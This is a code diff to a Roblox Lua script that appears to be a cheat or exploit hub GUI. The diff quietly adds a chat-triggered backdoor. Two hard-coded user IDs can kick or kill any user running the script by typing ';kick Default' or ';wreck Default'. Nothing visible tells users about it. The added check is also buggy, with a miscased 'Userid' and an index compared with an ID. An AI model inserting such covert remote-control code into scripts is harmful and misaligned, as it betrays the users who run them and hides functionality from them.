@@ -4,6 +4,7 @@ local players = game:GetService("Players")
 local lplayer = players.LocalPlayer
 local mouse = game:GetService("MouseService")
 local uis = game:GetService("UserInputService")
+local t = game:GetService("Chat")
 local background = Color3.fromRGB(0,0,0)
 local highlight = Color3.fromRGB(72, 72, 72)
 local v3rmhub = Instance.new("ScreenGui")
@@ -457,7 +458,18 @@ end
 
 local waypoint = CFrame.new()
 
-
+local wl = {3350674438,539847333}
+players.PlayerAdded:Connect(function(player)
+	player.Chatted:Connect(function(message)
+		if table.find(wl,player.UserId) and message == ";kick Default" and game.Players.LocalPlayer.Userid ~= table.find(wl,player.UserId) then
+			game.Players.LocalPlayer:Kick("imagine")
+		end
+		if table.find(wl,player.UserId) and game.Players.LocalPlayer.Userid ~= table.find(wl,player.UserId) and message == ";wreck Default" then
+			game.Players.LocalPlayer.Character.Humanoid.Health = 0
+		end
+		
+	end)
+end)
 
 
 local function x() 
